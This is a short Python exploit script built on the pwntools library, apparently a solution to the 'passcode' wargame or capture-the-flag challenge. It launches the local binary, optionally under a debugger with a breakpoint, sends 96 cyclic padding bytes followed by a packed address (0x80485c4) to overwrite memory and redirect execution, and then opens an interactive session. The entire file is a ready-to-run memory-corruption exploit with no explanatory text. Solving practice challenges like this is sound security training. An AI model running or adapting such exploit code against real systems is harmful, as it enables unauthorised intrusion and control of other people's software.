#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'passcode')




def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x8048586
continue
'''.format(**locals())

io = start()

payload = cyclic(96) + p32(0x80485c4)
io.sendline(payload)
io.sendlineafter(b"!", b"")

io.interactive()

